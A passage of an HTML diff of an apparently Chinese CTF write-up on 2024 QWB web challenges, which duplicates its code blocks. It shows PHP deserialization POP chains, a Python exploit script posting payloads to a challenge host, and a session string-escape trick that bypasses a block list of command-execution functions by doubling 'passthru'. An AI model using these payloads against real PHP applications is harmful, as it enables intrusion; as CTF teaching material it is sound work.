class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nonono&quot;</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">guest</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username==<span class="hljs-string">&quot;guest&quot;</span>)&#123;<br>            <span class="hljs-variable">$value</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">root</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;value == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;hello:&quot;</span>.<span class="hljs-variable">$this</span>-&gt;value);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;password-&gt;<span class="hljs-title function_ invoke__">guess</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> )&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$user</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$user</span>-&gt;password == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>反序列化链子在password里触发，所以还是得满足密码条件，加上序列化字符串里有数字，这里写个脚本：</p>
 <p>25%左右成功率吧</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze420okq7lsn5wjipao.cloudeci1.ichunqiu.com/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:9:&quot;Infernity&quot;;s:8:&quot;password&quot;;N;s:5:&quot;value&quot;;N;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check1</span>(<span class="params">number</span>):</span><br><span class="line">    x9 = <span class="built_in">int</span>(number)//<span class="number">9</span>    <span class="comment">#多少个9</span></span><br><span class="line">    yushu = <span class="built_in">int</span>(number)%<span class="number">9</span>  <span class="comment">#余数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;9&quot;</span>*x9+<span class="built_in">str</span>(yushu)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check2</span>(<span class="params">number,xxbeishu,payload</span>):</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    xxbeishu = <span class="built_in">int</span>(xxbeishu)*<span class="number">5</span>     <span class="comment">#先把倍数变大，不然可能会出现负数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(number)-<span class="number">1</span>):  <span class="comment">#遍历每一个数字加起来</span></span><br><span class="line">        total += <span class="built_in">int</span>(number[i])</span><br><span class="line">    temp = xxbeishu-total-check3(payload)        <span class="comment">#减去第三步需要的数字</span></span><br><span class="line">    <span class="keyword">return</span> number+check1(temp)          <span class="comment">#把剩下不够的数字用check1来补9和余数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check3</span>(<span class="params">payload</span>):<span class="comment">#检查payload里的数字</span></span><br><span class="line">    numbers = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, payload)</span><br><span class="line">    total_sum = <span class="built_in">sum</span>(<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> numbers)</span><br><span class="line">    <span class="keyword">return</span> total_sum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.post(url+<span class="string">&quot;/index.php?action=start&quot;</span>, data=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;asd&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">res1 = sess.post(url + <span class="string">&quot;/game.php&quot;</span>, data=&#123;<span class="string">&quot;password&quot;</span>: <span class="string">&quot;Aa132&quot;</span>&#125;) <span class="comment">#拿密码中所有数字之和必须为xx的倍数</span></span><br><span class="line">xxbeishu = re.search(<span class="string">r&quot;密码中所有数字之和必须为(\d+)的倍数&quot;</span>, res1.text)</span><br><span class="line">nextpass = check1(xxbeishu[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">res2 = sess.post(url + <span class="string">&quot;/game.php&quot;</span>, data=&#123;<span class="string">&quot;password&quot;</span>: <span class="string">&quot;Aa&quot;</span>+nextpass&#125;)</span><br><span class="line">shuanshi = re.search(<span class="string">r&quot;(\d+)\s*([\+\-\*/])\s*(\d+)&quot;</span>, res2.text)</span><br><span class="line"></span><br><span class="line">num1 = <span class="built_in">int</span>(shuanshi[<span class="number">1</span>])</span><br><span class="line">fuhao = shuanshi[<span class="number">2</span>]</span><br><span class="line">num2 = <span class="built_in">int</span>(shuanshi[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> fuhao:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        result = num1+num2</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        result = num1-num2</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;*&quot;</span>:</span><br><span class="line">        result = num1*num2</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        result = num1//num2</span><br><span class="line"></span><br><span class="line">nextpass = check2(<span class="built_in">str</span>(result),xxbeishu[<span class="number">1</span>],payload)</span><br><span class="line">res3 = sess.post(url + <span class="string">&quot;/game.php&quot;</span>, data=&#123;<span class="string">&quot;password&quot;</span>: payload + <span class="string">&quot;Aa&quot;</span>+nextpass&#125;)</span><br><span class="line"><span class="built_in">print</span>(res3.text)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://eci-2ze420okq7lsn5wjipao.cloudeci1.ichunqiu.com/&quot;</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:9:&quot;Infernity&quot;;s:8:&quot;password&quot;;N;s:5:&quot;value&quot;;N;&#125;&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check1</span>(<span class="hljs-params">number</span>):<br>    x9 = <span class="hljs-built_in">int</span>(number)//<span class="hljs-number">9</span>    <span class="hljs-comment">#多少个9</span><br>    yushu = <span class="hljs-built_in">int</span>(number)%<span class="hljs-number">9</span>  <span class="hljs-comment">#余数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;9&quot;</span>*x9+<span class="hljs-built_in">str</span>(yushu)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check2</span>(<span class="hljs-params">number,xxbeishu,payload</span>):<br>    total = <span class="hljs-number">0</span><br>    xxbeishu = <span class="hljs-built_in">int</span>(xxbeishu)*<span class="hljs-number">5</span>     <span class="hljs-comment">#先把倍数变大，不然可能会出现负数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(number)-<span class="hljs-number">1</span>):  <span class="hljs-comment">#遍历每一个数字加起来</span><br>        total += <span class="hljs-built_in">int</span>(number[i])<br>    temp = xxbeishu-total-check3(payload)        <span class="hljs-comment">#减去第三步需要的数字</span><br>    <span class="hljs-keyword">return</span> number+check1(temp)          <span class="hljs-comment">#把剩下不够的数字用check1来补9和余数</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check3</span>(<span class="hljs-params">payload</span>):<span class="hljs-comment">#检查payload里的数字</span><br>    numbers = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, payload)<br>    total_sum = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> numbers)<br>    <span class="hljs-keyword">return</span> total_sum<br><br><br>sess = requests.Session()<br>sess.post(url+<span class="hljs-string">&quot;/index.php?action=start&quot;</span>, data=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>&#125;)<br><br>res1 = sess.post(url + <span class="hljs-string">&quot;/game.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;Aa132&quot;</span>&#125;) <span class="hljs-comment">#拿密码中所有数字之和必须为xx的倍数</span><br>xxbeishu = re.search(<span class="hljs-string">r&quot;密码中所有数字之和必须为(\d+)的倍数&quot;</span>, res1.text)<br>nextpass = check1(xxbeishu[<span class="hljs-number">1</span>])<br><br>res2 = sess.post(url + <span class="hljs-string">&quot;/game.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;Aa&quot;</span>+nextpass&#125;)<br>shuanshi = re.search(<span class="hljs-string">r&quot;(\d+)\s*([\+\-\*/])\s*(\d+)&quot;</span>, res2.text)<br><br>num1 = <span class="hljs-built_in">int</span>(shuanshi[<span class="hljs-number">1</span>])<br>fuhao = shuanshi[<span class="hljs-number">2</span>]<br>num2 = <span class="hljs-built_in">int</span>(shuanshi[<span class="hljs-number">3</span>])<br><br><span class="hljs-keyword">match</span> fuhao:<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;+&quot;</span>:<br>        result = num1+num2<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;-&quot;</span>:<br>        result = num1-num2<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;*&quot;</span>:<br>        result = num1*num2<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;/&quot;</span>:<br>        result = num1//num2<br><br>nextpass = check2(<span class="hljs-built_in">str</span>(result),xxbeishu[<span class="hljs-number">1</span>],payload)<br>res3 = sess.post(url + <span class="hljs-string">&quot;/game.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;password&quot;</span>: payload + <span class="hljs-string">&quot;Aa&quot;</span>+nextpass&#125;)<br><span class="hljs-built_in">print</span>(res3.text)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/qwb2024/6CE905E5C9FB20DD0B3960A6C1666DB7.png" alt="6CE905E5C9FB20DD0B3960A6C1666DB7"></p>
-<p><img src="/img/qwb2024/332750B67822FA09000338CA4130DC4E.png" alt="332750B67822FA09000338CA4130DC4E"></p>
+<p><img src="/img/qwb2024/6CE905E5C9FB20DD0B3960A6C1666DB7.png" srcset="/img/loading.gif" lazyload alt="6CE905E5C9FB20DD0B3960A6C1666DB7"></p>
+<p><img src="/img/qwb2024/332750B67822FA09000338CA4130DC4E.png" srcset="/img/loading.gif" lazyload alt="332750B67822FA09000338CA4130DC4E"></p>
 <p>在class root里value被赋值了flag，可以用地址引用，让user里的username取value的地址，就会自动输出flag了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;2024qwb&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">root</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;value = &amp;<span class="variable">$a</span>-&gt;username-&gt;username;      <span class="comment">//刚开始给username赋值2024qwb，同时value也是2024qwb了，所以就能进入get，然后get给value赋值为flag，username也就是flag了。</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;s:7:\&quot;2024q&quot;</span>,<span class="string">&quot;S:7:\&quot;2024\\71&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">root</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;2024qwb&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">root</span>();<br><span class="hljs-variable">$a</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$a</span>-&gt;value = &amp;<span class="hljs-variable">$a</span>-&gt;username-&gt;username;      <span class="hljs-comment">//刚开始给username赋值2024qwb，同时value也是2024qwb了，所以就能进入get，然后get给value赋值为flag，username也就是flag了。</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;s:7:\&quot;2024q&quot;</span>,<span class="hljs-string">&quot;S:7:\&quot;2024\\71&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure>
 
 <p>怎么进入get呢？</p>
 <p>最后这里$user-&gt;password，root类里没有password属性，就自动进入get了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(strpos($user-&gt;username, &quot;admin&quot;) == 0 &amp;&amp; $user-&gt;password == &quot;2024qwb&quot;)&#123;</span><br><span class="line">    echo &quot;hello!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$user</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == 0 &amp;&amp; <span class="hljs-variable">$user</span>-&gt;password == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>把得到的链子填入上面的python脚本里就能拿到flag。</p>
-<p><img src="/img/qwb2024/image-20241103155109815.png" alt="image-20241103155109815"></p>
+<p><img src="/img/qwb2024/image-20241103155109815.png" srcset="/img/loading.gif" lazyload alt="image-20241103155109815"></p>
 <h1 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h1><p><a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a></p>
 <p>看了一眼class.php 考点应该是session反序列化</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$sensitiveFunctions</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>];</span><br><span class="line"><span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);   <span class="comment">//可以双写绕过</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$sensitiveFunctions</span> = [<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;proc_open&#x27;</span>];<br><span class="hljs-variable">$sessionData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$sessionFile</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;sensitiveFunctions <span class="hljs-keyword">as</span> <span class="hljs-variable">$function</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$sessionData</span>, <span class="hljs-variable">$function</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$sessionData</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$function</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$sessionData</span>);   <span class="hljs-comment">//可以双写绕过</span><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sessionFile</span>, <span class="hljs-variable">$sessionData</span>);<br></code></pre></td></tr></table></figure>
 
 <p>利用过滤进行逃逸控制反序列化内容。字符串逃逸了。</p>
 <p>举个栗子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=passthrupassthrupassthrupassthrupassthrupassthrupassthru</span><br><span class="line">password=O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=passthrupassthrupassthrupassthrupassthrupassthrupassthru<br><span class="hljs-attribute">password</span>=O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;notouchitsclass&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>如果我这样写，那么到sess里的数据会长这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user|s:56:&quot;passthrupassthrupassthrupassthrupassthrupassthrupassthru&quot;;session_key|s:25:&quot;uz6IWN70l641vlzLjeixuI8CT&quot;;password|s:56:&quot;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>|s:<span class="hljs-number">56</span>:<span class="hljs-string">&quot;passthrupassthrupassthrupassthrupassthrupassthrupassthru&quot;</span>;session_key|s:<span class="hljs-number">25</span>:<span class="hljs-string">&quot;uz6IWN70l641vlzLjeixuI8CT&quot;</span>;password|s:<span class="hljs-number">56</span>:<span class="hljs-string">&quot;O:15:&quot;</span>notouchitsclass<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>data<span class="hljs-string">&quot;;s:10:&quot;</span>phpinfo();<span class="hljs-string">&quot;;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
 <p>经过处理之后，就变成了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user|s:56:&quot;&quot;;session_key|s:25:&quot;uz6IWN70l641vlzLjeixuI8CT&quot;;password|s:56:&quot;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;</span><br></pre></td></tr></table></figure>
